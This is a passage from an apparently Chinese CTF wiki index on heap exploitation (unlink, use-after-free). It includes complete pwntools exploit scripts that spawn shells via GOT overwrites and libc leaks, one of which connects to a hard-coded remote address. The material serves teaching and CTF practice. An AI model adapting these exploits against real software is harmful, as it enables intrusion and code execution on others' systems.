\u5730\u5740\u3002\u4ece\u800c\u5f53\u518d\u6b21\u91ca\u653e\u67d0\u5757\u5185\u5b58\u65f6\uff0c\u4fbf\u53ef\u4ee5\u542f\u52a8shell\u3002   \u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  context . terminal   =   [ gnome-terminal ,   -x ,   sh ,   -c ]  if   args [ DEBUG ]: \n     context . log_level   =   debug  context . binary   =   ./wheelofrobots  robots   =   ELF ( ./wheelofrobots )  if   args [ REMOTE ]: \n     p   =   remote ( 127.0.0.1 ,   7777 )  else : \n     p   =   process ( ./wheelofrobots )  log . info ( PID:    +   str ( proc . pidof ( p )[ 0 ]))  libc   =   ELF ( ./libc.so.6 )  def   offset_bin_main_arena ( idx ): \n     word_bytes   =   context . word_size   /   8 \n     offset   =   4    # lock \n     offset   +=   4    # flags \n     offset   +=   word_bytes   *   10    # offset fastbin \n     offset   +=   word_bytes   *   2    # top,last_remainder \n     offset   +=   idx   *   2   *   word_bytes    # idx \n     offset   -=   word_bytes   *   2    # bin overlap \n     return   offset  def   add ( idx ,   size = 0 ): \n     p . recvuntil ( Your choice : ) \n     p . sendline ( 1 ) \n     p . recvuntil ( Your choice : ) \n     p . sendline ( str ( idx )) \n     if   idx   ==   2 : \n         p . recvuntil ( Increase Bender s intelligence:  ) \n         p . sendline ( str ( size )) \n     elif   idx   ==   3 : \n         p . recvuntil ( Increase Robot Devil s cruelty:  ) \n         p . sendline ( str ( size )) \n     elif   idx   ==   6 : \n         p . recvuntil ( Increase Destructor s powerful:  ) \n         p . sendline ( str ( size ))  def   remove ( idx ): \n     p . recvuntil ( Your choice : ) \n     p . sendline ( 2 ) \n     p . recvuntil ( Your choice : ) \n     p . sendline ( str ( idx ))  def   change ( idx ,   name ): \n     p . recvuntil ( Your choice : ) \n     p . sendline ( 3 ) \n     p . recvuntil ( Your choice : ) \n     p . sendline ( str ( idx )) \n     p . recvuntil ( Robot s name:  \\n ) \n     p . send ( name )  def   start_robot (): \n     p . recvuntil ( Your choice : ) \n     p . sendline ( 4 )  def   overflow_benderinuse ( inuse ): \n     p . recvuntil ( Your choice : ) \n     p . sendline ( 1 ) \n     p . recvuntil ( Your choice : ) \n     p . send ( 9999   +   inuse )  def   write ( where ,   what ): \n     change ( 1 ,   p64 ( where )) \n     change ( 6 ,   p64 ( what ))  def   exp (): \n     print   step 1 \n     # add a fastbin chunk 0x20 and free it \n     # so it is in fastbin, idx2- NULL \n     add ( 2 ,   1 )    # idx2 \n     remove ( 2 ) \n     # overflow bender inuse with 1 \n     overflow_benderinuse ( \\x01 ) \n     # change bender s fd to 0x603138, point to bender s size \n     # now fastbin 0x20, idx2- 0x603138- NULL \n     change ( 2 ,   p64 ( 0x603138 )) \n     # in order add bender again \n     overflow_benderinuse ( \\x00 ) \n     # add bender again, fastbin 0x603138- NULL \n     add ( 2 ,   1 ) \n     # in order to malloc chunk at 0x603138 \n     # we need to bypass the fastbin size check, i.e. set *0x603140=0x20 \n     # it is at Robot Devil \n     add ( 3 ,   0x20 ) \n     # trigger malloc, set tinny point to 0x603148 \n     add ( 1 ) \n     # wheels must  = 3 \n     remove ( 2 ) \n     remove ( 3 ) \n\n     print   step 2 \n     # alloc Destructor size 60- 0x50, chunk content 0x40 \n     add ( 6 ,   3 ) \n     # alloc devil, size=20*7=140, bigger than fastbin \n     add ( 3 ,   7 ) \n     # edit destructor s size to 1000 by tinny \n     change ( 1 ,   p64 ( 1000 )) \n     # place fake chunk at destructor s pointer \n     fakechunk_addr   =   0x6030E8 \n     fakechunk   =   p64 ( 0 )   +   p64 ( 0x20 )   +   p64 ( fakechunk_addr   -   0x18 )   +   p64 ( \n         fakechunk_addr   -   0x10 )   +   p64 ( 0x20 ) \n     fakechunk   =   fakechunk . ljust ( 0x40 ,   a ) \n     fakechunk   +=   p64 ( 0x40 )   +   p64 ( 0xa0 ) \n     change ( 6 ,   fakechunk ) \n     # trigger unlink \n     remove ( 3 ) \n\n     print   step 3 \n     # make 0x6030F8 point to 0x6030E8 \n     payload   =   p64 ( 0 )   *   2   +   0x18   *   a   +   p64 ( 0x6030E8 ) \n     change ( 6 ,   payload ) \n\n     print   step 4 \n     # make exit just as return \n     write ( robots . got [ exit ],   0x401954 ) \n\n     print   step 5 \n     # set wheel cnt =3, 0x603130 in order to start robot \n     write ( 0x603130 ,   3 ) \n     # set destructor point to puts@got \n     change ( 1 ,   p64 ( robots . got [ puts ])) \n     start_robot () \n     p . recvuntil ( New hands great!! Thx  ) \n     puts_addr   =   p . recvuntil ( ! \\n ,   drop = True ) . ljust ( 8 ,   \\x00 ) \n     puts_addr   =   u64 ( puts_addr ) \n     log . success ( puts addr:    +   hex ( puts_addr )) \n     libc_base   =   puts_addr   -   libc . symbols [ puts ] \n     log . success ( libc base:    +   hex ( libc_base )) \n     system_addr   =   libc_base   +   libc . symbols [ system ] \n     binsh_addr   =   libc_base   +   next ( libc . search ( /bin/sh )) \n\n     # make free- system \n     write ( robots . got [ free ],   system_addr ) \n     # make destructor point to /bin/sh addr \n     write ( 0x6030E8 ,   binsh_addr ) \n     # get shell \n     remove ( 6 ) \n     p . interactive () \n\n     pass  if   __name__   ==   __main__ : \n     exp ()", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/heap/unlink/#_12", 
            "text": "DEFCON 2017 Qualifiers beatmeonthedl", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/unlink/#_13", 
            "text": "malloc@angelboy  https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a", 
            "title": "\u53c2\u8003"
        }, 
        {
            "location": "/pwn/heap/unlink/#note3", 
            "text": "", 
            "title": "note3"
        }, 
        {
            "location": "/pwn/heap/unlink/#_14", 
            "text": "ZCTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u70b9\u662fsafe unlink\u7684\u5229\u7528\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/unlink/#_15", 
            "text": "\u9898\u76ee\u662f\u4e00\u4e2anotepad\uff0c\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u67e5\u770b\u7b14\u8bb0\u7684\u529f\u80fd  1.New note\n2.Show note\n3.Edit note\n4.Delete note\n5.Quit\noption---   \u4fdd\u62a4\u5982\u4e0b\u6240\u793a  Canary                        : Yes\nNX                            : Yes\nPIE                           : No\nFortify                       : No\nRelRO                         : Partial", 
            "title": "\u9898\u76ee\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/unlink/#_16", 
            "text": "\u7a0b\u5e8fNew\u529f\u80fd\u7528\u6765\u65b0\u5efa\u7b14\u8bb0\uff0c\u7b14\u8bb0\u7684\u5927\u5c0f\u53ef\u4ee5\u81ea\u5b9a\u53ea\u8981\u5c0f\u4e8e1024\u5b57\u8282\u3002  int new()\n{\n  puts( Input the length of the note content:(less than 1024) );\n  size = get_num();\n  if ( size   0 )\n    return puts( Length error );\n  if ( size   1024 )\n    return puts( Content is too long );\n  heap_ptr = malloc(size);\n  puts( Input the note content: );\n  my_read(heap_ptr, size,  \\n );\n  bss_ptr[i] = heap_ptr;\n  current_ptr[i + 8LL] = size;\n  current_ptr[0] = bss_ptr[i];\n  return printf( note add success, the id is %d\\n , i);\n}  \u6240\u6709\u7684\u7b14\u8bb0malloc\u51fa\u6765\u7684\u6307\u9488\u5b58\u653e\u5728bss\u4e0a\u5168\u5c40\u6570\u7ec4bss_ptr\u4e2d\uff0c\u8fd9\u4e2a\u6570\u7ec4\u6700\u591a\u53ef\u4ee5\u5b58\u653e7\u4e2aheap_ptr\u3002\n\u800c\u4e14heap_ptr\u5bf9\u5e94\u7684size\u4e5f\u88ab\u653e\u5728bss_ptr\u6570\u7ec4\u4e2d\u3002current_ptr\u8868\u793a\u5f53\u524d\u7b14\u8bb0\uff0cbss\u5e03\u5c40\u5982\u4e0b\u3002  .bss:\ncurrent_ptr\nnote0_ptr\nnote1_ptr\nnote2_ptr\nnote3_ptr\nnote4_ptr\nnote5_ptr\nnote6_ptr\nnote7_ptr\nnote0_size\nnote1_size\nnote2_size\nnote3_size\nnote4_size\nnote5_size\nnote6_size\nnote7_size  Show\u529f\u80fd\u662f\u65e0\u7528\u7684\u529f\u80fd\uff0cedit\u548cdelete\u53ef\u4ee5\u7f16\u8f91\u548c\u91ca\u653enote\u3002", 
            "title": "\u529f\u80fd\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/unlink/#_17", 
            "text": "\u6f0f\u6d1e\u5b58\u5728\u4e8eedit\u529f\u80fd\u4e2d\uff0c\u8fd9\u91cc\u9762\u5728\u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684id\u53f7\u4e4b\u540e\u5e76\u6ca1\u6709\u8fdb\u884c\u9a8c\u8bc1\u3002\u5982\u679c\u8f93\u5165\u7684id\u662f\u8d1f\u6570\u7684\u8bdd\u4f9d\u7136\u53ef\u4ee5\u6267\u884c\u3002\n\u5728get_num\u51fd\u6570\u4e2d\u5b58\u5728\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e2a\u8d1f\u6570\u3002  int edit()\n{\n\n  id = get_num();\n  data_ptr = ptr[id];\n  if ( data_ptr )\n  {\n    puts( Input the new content: );\n    my_read(ptr[id], current_ptr[id + 8],  \\n );\n    current_ptr[0] = ptr[id];\n    data_ptr = puts( Edit success );\n  }\n}  \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97edit\u8bfb\u5165cuurent_ptr\uff0c\u4f7f\u7528\u7684size\u662fnote7_ptr .bss:\ncurrent_ptr  == edit ptr\nnote0_ptr\nnote1_ptr\nnote2_ptr\nnote3_ptr\nnote4_ptr\nnote5_ptr\nnote6_ptr\nnote7_ptr    == size\nnote0_size\nnote1_size\nnote2_size\nnote3_size\nnote4_size\nnote5_size\nnote6_size\nnote7_size \n\u9996\u5148\u521b\u5efa8\u4e2anote\uff0c\u7136\u540eedit note3\u4f7fcurrent_ptr\u6307\u5411note3\uff0c\u4e4b\u540e\u4f7f\u7528-1\u6ea2\u51fanote3 new(512, a )\nnew(512, a )\nnew(512, a )\nnew(512, a )\nnew(512, a )\nnew(512, a )\nnew(512, a )\nnew(512, a )\n\nedit(3, a )\nedit(-9223372036854775808,data);  \u6211\u4eec\u4f7f\u7528\u7684\u6ea2\u51fa\u6570\u636e\u662f\u7528\u4e8e\u6784\u9020\u4e00\u4e2afake chunk\u6765\u5b9e\u73b0safe unlink\u7684\u5229\u7528\uff0c\u5177\u4f53\u7684\u539f\u7406\u53ef\u4ee5\u770b\u8fd9\u4e00\u7ae0\u8282\u7684\u8bb2\u89e3\u3002  data =  \ndata += p64(0) + p64(512+1) #fake chunk header\ndata += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk \ndata +=  A *(512-32) \ndata += p64(512) + p64(512+16)   \u4e4b\u540e\u91ca\u653enote4\uff0cnote3\u4e0enote4\u5c31\u4f1a\u5408\u5e76\u3002note3_ptr\u4f1a\u6307\u5411note0_ptr\u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u6211\u4eec\u901a\u8fc7\u4e0d\u65ad\u7684\u4fee\u6539note0_ptr\u7684\u503c\u548cedit note0\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6570\u636e\u3002  \u4f46\u662f\u9898\u76ee\u6ca1\u6709\u63d0\u4f9bshow\u529f\u80fd\uff0c\u6240\u4ee5\u65e0\u6cd5\u8fdb\u884c\u4efb\u610f\u5730\u5740\u8bfb\uff0c\u4e5f\u5c31\u65e0\u6cd5\u6cc4\u6f0f\u6570\u636e\u3002\n\u8fd9\u91cc\u91c7\u7528\u7684\u529e\u6cd5\u662f\u628afree\u7684got\u8868\u6539\u4e3aprintf\u7684\u503c\uff0c\u7136\u540e\u5728bbs\u4e2d\u4e00\u5757\u7a7a\u767d\u7684\u533a\u57df\u5199\u5165\"%x\"\u3002\n\u8fd9\u6837\u5f53free\u8fd9\u5757\u533a\u57df\uff08\u8fd9\u5757\u533a\u57df\u5728ptr_array\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4f20\u9012\u7ed9free\uff09\uff0c\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fa\u6808\u4e2d\u7684\u6570\u636e\u3002\n\u901a\u8fc7\u6808\u4e2d\u7684libc\u5730\u5740\u6c42\u51fasystem\u7684\u5730\u5740\u5c31\u53ef\u4ee5\u5229\u7528\u4efb\u610f\u5730\u5740\u5199\u83b7\u5f97shell  free(4)\n\nedit(3,free_got)\nedit(0,printf_plt)\n\nedit(3,p64(0x6020e8))\nedit(0, %llx. *30) \n\u5b8c\u6210\u7684exp\u5982\u4e0b  #!/usr/bin/python\n# -*- coding: utf-8 -*-\nfrom pwn import *\nimport time\ndef malloc(size,data):\n    print conn.recvuntil( )\n    conn.sendline( 1 )\n    print conn.recvuntil( 1024) )\n    conn.sendline(str(size))\n    print conn.recvuntil( content: )\n    conn.sendline(data)\n    print conn.recvuntil( \\n )\ndef edit(id,data):\n    print conn.recvuntil( )\n    conn.sendline( 3 )\n    print conn.recvuntil( note: )\n    conn.sendline(str(id))\n    print conn.recvuntil( ent: )\n    conn.sendline(data)\n    print conn.recvuntil( success )\ndef free(id):\n    print conn.recvuntil( )\n    conn.sendline( 4 )\n    print conn.recvuntil( note: )\n    conn.sendline(str(id))\n    print conn.recvuntil( success )\n\n#conn = remote( 127.0.0.1 ,9999)\nconn = remote( 115.28.27.103 ,9003)\nfree_got = p64(0x602018)\nputs_got = p64(0x602020)\nstack_got = p64(0x602038)\nprintf_got = p64(0x602030)\nexit_got = p64(0x602078)\nprintf_plt = p64(0x400750)\nputs_plt = p64(0x400730)\n#libcstartmain_ret_off = 0x21b45\n#sys_off = 0x414f0\nlibcstartmain_ret_off = 0x21ec5\nsys_off = 0x46640\n# 1. int overflow lead to double free\nintoverflow = -9223372036854775808\nmalloc(512, /bin/sh\\0 )\nmalloc(512, /bin/sh\\0 )\nmalloc(512, /bin/sh\\0 )\nmalloc(512, /bin/sh\\0 )\nmalloc(512, /bin/sh\\0 )\nmalloc(512, /bin/sh\\0 )\nmalloc(512,p64(0x400ef8))\nmalloc(512, /bin/sh\\0 )\n# 2. make a fake chunk and modify the next chunk s pre size \nfakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) +  A *(512-32) + p64(512) + p64(512+16)\nedit(3, aaaaaa )\nedit(intoverflow,fakechunk)\n# 3. double free\nfree(4)\n# 4. overwrite got\nedit(3,free_got)\nedit(0,printf_plt+printf_plt)\n# 5. leak the stack data\nedit(3,p64(0x6020e8))\nedit(0, %llx. *30)\n#free- puts\nprint conn.recvuntil( )\nconn.sendline( 4 )\nprint conn.recvuntil( note: )\nconn.sendline(str(0))\n#time.sleep(0.3)\nret =  conn.recvuntil( success )\nprint ret\n# 6. calcuate the system s addr\nlibcstart = ret.split( . )[10]\nlibcstart_2 = int(libcstart,16) - libcstartmain_ret_off\nprint  libc start addr: ,hex(libcstart_2)\nsystem_addr = libcstart_2 + sys_off\nprint  system_addr: ,hex(system_addr)\n# 7. overwrite free s got\nedit(3,free_got)\nedit(0,p64(system_addr)+printf_plt)\n# 8. write argv\nedit(3,p64(0x6020d0))\nedit(0, /bin/sh\\0 )\n# 9. exploit\nprint conn.recvuntil( )\nconn.sendline( 4 )\nprint conn.recvuntil( note: )\nconn.sendline(str(0))\nsleep(0.2)\nconn.interactive()", 
            "title": "\u6f0f\u6d1e"
        }, 
        {
            "location": "/pwn/heap/use_after_free/", 
            "text": "Use After Free\n\n\n\u539f\u7406\n\n\n\u7b80\u5355\u7684\u8bf4\uff0cUse After Free \u5c31\u662f\u5176\u5b57\u9762\u6240\u8868\u8fbe\u7684\u610f\u601d\uff0c\u5f53\u4e00\u4e2a\u5185\u5b58\u5757\u88ab\u91ca\u653e\u4e4b\u540e\u518d\u6b21\u88ab\u4f7f\u7528\u3002\u4f46\u662f\u5176\u5b9e\u8fd9\u91cc\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\n\n\n\n\n\u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c \u7136\u540e\u518d\u6b21\u4f7f\u7528\uff0c\u81ea\u7136\u7a0b\u5e8f\u4f1a\u5d29\u6e83\u3002\n\n\n\u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c\u7136\u540e\u5728\u5b83\u4e0b\u4e00\u6b21\u88ab\u4f7f\u7528\u4e4b\u524d\uff0c\u6ca1\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u5757\u8fdb\u884c\u4fee\u6539\uff0c\u90a3\u4e48\n\u7a0b\u5e8f\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u8f6c\n\u3002\n\n\n\u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\uff0c\u4f46\u662f\u5728\u5b83\u4e0b\u4e00\u6b21\u4f7f\u7528\u4e4b\u524d\uff0c\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u8fdb\u884c\u4e86\u4fee\u6539\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u518d\u6b21\u4f7f\u7528\u8fd9\u5757\u5185\u5b58\u65f6\uff0c\n\u5c31\u5f88\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0\u5947\u602a\u7684\u95ee\u9898\n\u3002\n\n\n\n\n\u800c\u6211\u4eec\u4e00\u822c\u6240\u6307\u7684 \nUse After Free\n \u6f0f\u6d1e\u4e3b\u8981\u662f\u540e\u4e24\u79cd\u3002\u6b64\u5916\uff0c\n\u6211\u4eec\u4e00\u822c\u79f0\u88ab\u91ca\u653e\u540e\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\u7684\u5185\u5b58\u6307\u9488\u4e3adangling pointer\u3002\n\n\n\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\n\n\n#include\n \nstdio.h\n\n\n#include\n \nstdlib.h\n\n\ntypedef\n \nstruct\n \nname\n \n{\n\n  \nchar\n \n*\nmyname\n;\n\n  \nvoid\n \n(\n*\nfunc\n)(\nchar\n \n*\nstr\n);\n\n\n}\n \nNAME\n;\n\n\nvoid\n \nmyprint\n(\nchar\n \n*\nstr\n)\n \n{\n \nprintf\n(\n%s\n\\n\n,\n \nstr\n);\n \n}\n\n\nvoid\n \nprintmyname\n()\n \n{\n \nprintf\n(\ncall print my name\n\\n\n);\n \n}\n\n\nint\n \nmain\n()\n \n{\n\n  \nNAME\n \n*\na\n;\n\n  \na\n \n=\n \n(\nNAME\n \n*\n)\nmalloc\n(\nsizeof\n(\nstruct\n \nname\n));\n\n  \na\n-\nfunc\n \n=\n \nmyprint\n;\n\n  \na\n-\nmyname\n \n=\n \nI can also use it\n;\n\n  \na\n-\nfunc\n(\nthis is my function\n);\n\n  \n// free without modify\n\n  \nfree\n(\na\n);\n\n  \na\n-\nfunc\n(\nI can also use it\n);\n\n  \n// free with modify\n\n  \na\n-\nfunc\n \n=\n \nprintmyname\n;\n\n  \na\n-\nfunc\n(\nthis is my function\n);\n\n  \n// set NULL\n\n  \na\n \n=\n \nNULL\n;\n\n  \nprintf\n(\nthis pogram will crash...\n\\n\n);\n\n  \na\n-\nfunc\n(\ncan not be printed...\n);\n\n\n}\n\n\n\n\n\n\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  use_after_free git:\n(\nuse_after_free\n)\n \u2717 ./use_after_free                      \nthis is my \nfunction\n\nI can also use it\ncall print my name\nthis pogram will crash...\n\n[\n1\n]\n    \n38738\n segmentation fault \n(\ncore dumped\n)\n  ./use_after_free\n\n\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 HITCON-training \u4e2d\u7684 lab 10 hacknote\u4e3a\u4f8b\u3002\n\n\n\u529f\u80fd\u5206\u6790\n\n\n\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6709\u4e2amenu\u51fd\u6570\uff0c\u5176\u4e2d\u6709\n\n\n  \nputs\n(\n 1. Add note          \n);\n\n  \nputs\n(\n 2. Delete note       \n);\n\n  \nputs\n(\n 3. Print note        \n);\n\n  \nputs\n(\n 4. Exit              \n);\n\n\n\n\n\n\u6545\u800c\u7a0b\u5e8f\u5e94\u8be5\u4e3b\u8981\u67093\u4e2a\u529f\u80fd\u3002\u4e4b\u540e\u7a0b\u5e8f\u4f1a\u6839\u636e\u7528\u6237\u7684\u8f93\u5165\u6267\u884c\u76f8\u5e94\u7684\u529f\u80fd\u3002\n\n\nadd_note\n\n\n\u6839\u636e\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u6700\u591a\u53ef\u4ee5\u6dfb\u52a05\u4e2anote\u3002\u6bcf\u4e2anote\u6709\u4e24\u4e2a\u5b57\u6bb5put\u4e0econtent\uff0c\u5176\u4e2dput\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u4f1a\u8f93\u51fa content \u5177\u4f53\u7684\u5185\u5bb9\u3002\n\n\nunsigned\n \nint\n \nadd_note\n()\n\n\n{\n\n  \nnote\n \n*\nv0\n;\n \n// ebx\n\n  \nsigned\n \nint\n \ni\n;\n \n// [esp+Ch] [ebp-1Ch]\n\n  \nint\n \nsize\n;\n \n// [esp+10h] [ebp-18h]\n\n  \nchar\n \nbuf\n;\n \n// [esp+14h] [ebp-14h]\n\n  \nunsigned\n \nint\n \nv5\n;\n \n// [esp+1Ch] [ebp-Ch]\n\n\n  \nv5\n \n=\n \n__readgsdword\n(\n0x14u\n);\n\n  \nif\n \n(\n \ncount\n \n=\n \n5\n \n)\n\n  \n{\n\n    \nfor\n \n(\n \ni\n \n=\n \n0\n;\n \ni\n \n=\n \n4\n;\n \n++\ni\n \n)\n\n    \n{\n\n      \nif\n \n(\n \n!\nnotelist\n[\ni\n]\n \n)\n\n      \n{\n\n        \nnotelist\n[\ni\n]\n \n=\n \nmalloc\n(\n8u\n);\n\n        \nif\n \n(\n \n!\nnotelist\n[\ni\n]\n \n)\n\n        \n{\n\n          \nputs\n(\nAlloca Error\n);\n\n          \nexit\n(\n-\n1\n);\n\n        \n}\n\n        \nnotelist\n[\ni\n]\n-\nput\n \n=\n \nprint_note_content\n;\n\n        \nprintf\n(\nNote size :\n);\n\n        \nread\n(\n0\n,\n \nbuf\n,\n \n8u\n);\n\n        \nsize\n \n=\n \natoi\n(\nbuf\n);\n\n        \nv0\n \n=\n \nnotelist\n[\ni\n];\n\n        \nv0\n-\ncontent\n \n=\n \nmalloc\n(\nsize\n);\n\n        \nif\n \n(\n \n!\nnotelist\n[\ni\n]\n-\ncontent\n \n)\n\n        \n{\n\n          \nputs\n(\nAlloca Error\n);\n\n          \nexit\n(\n-\n1\n);\n\n        \n}\n\n        \nprintf\n(\nContent :\n);\n\n        \nread\n(\n0\n,\n \nnotelist\n[\ni\n]\n-\ncontent\n,\n \nsize\n);\n\n        \nputs\n(\nSuccess !\n);\n\n        \n++\ncount\n;\n\n        \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv5\n;\n\n      \n}\n\n    \n}\n\n  \n}\n\n  \nelse\n\n  \n{\n\n    \nputs\n(\nFull\n);\n\n  \n}\n\n  \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv5\n;\n\n\n}\n\n\n\n\n\nprint_note\n\n\nprint_note\u5c31\u662f\u7b80\u5355\u7684\u6839\u636e\u7ed9\u5b9a\u7684note\u7684\u7d22\u5f15\u6765\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15\u7684note\u7684\u5185\u5bb9\u3002\n\n\nunsigned\n \nint\n \nprint_note\n()\n\n\n{\n\n  \nint\n \nv1\n;\n \n// [esp+4h] [ebp-14h]\n\n  \nchar\n \nbuf\n;\n \n// [esp+8h] [ebp-10h]\n\n  \nunsigned\n \nint\n \nv3\n;\n \n// [esp+Ch] [ebp-Ch]\n\n\n  \nv3\n \n=\n \n__readgsdword\n(\n0x14u\n);\n\n  \nprintf\n(\nIndex :\n);\n\n  \nread\n(\n0\n,\n \nbuf\n,\n \n4u\n);\n\n  \nv1\n \n=\n \natoi\n(\nbuf\n);\n\n  \nif\n \n(\n \nv1\n \n \n0\n \n||\n \nv1\n \n=\n \ncount\n \n)\n\n  \n{\n\n    \nputs\n(\nOut of bound!\n);\n\n    \n_exit\n(\n0\n);\n\n  \n}\n\n  \nif\n \n(\n \nnotelist\n[\nv1\n]\n \n)\n\n    \nnotelist\n[\nv1\n]\n-\nput\n(\nnotelist\n[\nv1\n]);\n\n  \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv3\n;\n\n\n}\n\n\n\n\n\ndelete_note\n\n\ndelete_note \u4f1a\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\u6765\u91ca\u653e\u5bf9\u5e94\u7684note\u3002\u4f46\u662f\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728 \u5220\u9664\u7684\u65f6\u5019\uff0c\u53ea\u662f\u5355\u7eaf\u8fdb\u884c\u4e86free\uff0c\u800c\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u8fd9\u91cc\u662f\u5b58\u5728Use After Free\u7684\u60c5\u51b5\u7684\u3002\n\n\nunsigned\n \nint\n \ndel_note\n()\n\n\n{\n\n  \nint\n \nv1\n;\n \n// [esp+4h] [ebp-14h]\n\n  \nchar\n \nbuf\n;\n \n// [esp+8h] [ebp-10h]\n\n  \nunsigned\n \nint\n \nv3\n;\n \n// [esp+Ch] [ebp-Ch]\n\n\n  \nv3\n \n=\n \n__readgsdword\n(\n0x14u\n);\n\n  \nprintf\n(\nIndex :\n);\n\n  \nread\n(\n0\n,\n \nbuf\n,\n \n4u\n);\n\n  \nv1\n \n=\n \natoi\n(\nbuf\n);\n\n  \nif\n \n(\n \nv1\n \n \n0\n \n||\n \nv1\n \n=\n \ncount\n \n)\n\n  \n{\n\n    \nputs\n(\nOut of bound!\n);\n\n    \n_exit\n(\n0\n);\n\n  \n}\n\n  \nif\n \n(\n \nnotelist\n[\nv1\n]\n \n)\n\n  \n{\n\n    \nfree\n(\nnotelist\n[\nv1\n]\n-\ncontent\n);\n\n    \nfree\n(\nnotelist\n[\nv1\n]);\n\n    \nputs\n(\nSuccess\n);\n\n  \n}\n\n  \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv3\n;\n\n\n}\n\n\n\n\n\n\u5229\u7528\u5206\u6790\n\n\n\u6211\u4eec\u53ef\u4ee5\u770b\u5230 Use After Free \u7684\u60c5\u51b5\u786e\u5b9e\u53ef\u80fd\u4f1a\u53d1\u751f\uff0c\u90a3\u4e48\u600e\u4e48\u53ef\u4ee5\u8ba9\u5b83\u53d1\u751f\u5e76\u4e14\u8fdb\u884c\u5229\u7528\u5462\uff1f\u9700\u8981\u540c\u65f6\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u8fd8\u6709\u4e00\u4e2amagic\u51fd\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u901a\u8fc7use after free \u6765\u4f7f\u5f97\u8fd9\u4e2a\u7a0b\u5e8f\u6267\u884cmagic\u51fd\u6570\u5462\uff1f\n\u4e00\u4e2a\u5f88\u76f4\u63a5\u7684\u60f3\u6cd5\u662f\u4fee\u6539note\u7684put\u5b57\u6bb5\u4e3amagic\u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0\u5728\u6267\u884cprint note \u7684\u65f6\u5019\u6267\u884cmagic\u51fd\u6570\u3002\n \u90a3\u4e48\u8be5\u600e\u4e48\u6267\u884c\u5462\uff1f                                                                         \n\n\n\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u6765\u770b\u4e00\u4e0b\u6bcf\u4e00\u4e2anote\u751f\u6210\u7684\u5177\u4f53\u6d41\u7a0b\n\n\n\n\n\u7a0b\u5e8f\u7533\u8bf78\u5b57\u8282\u5185\u5b58\u7528\u6765\u5b58\u653enote\u4e2d\u7684put\u4ee5\u53cacontent\u6307\u9488\u3002\n\n\n\u7a0b\u5e8f\u6839\u636e\u8f93\u5165\u7684size\u6765\u7533\u8bf7\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u7136\u540e\u7528\u6765\u5b58\u50a8content\u3002\n   +-----------------+                       \n   |   put           |                       \n   +-----------------+                       \n   |   content       |       size              \n   +-----------------+-------------------\n+----------------+\n                                          |     real       |\n                                          |    content     |\n                                          |                |\n                                          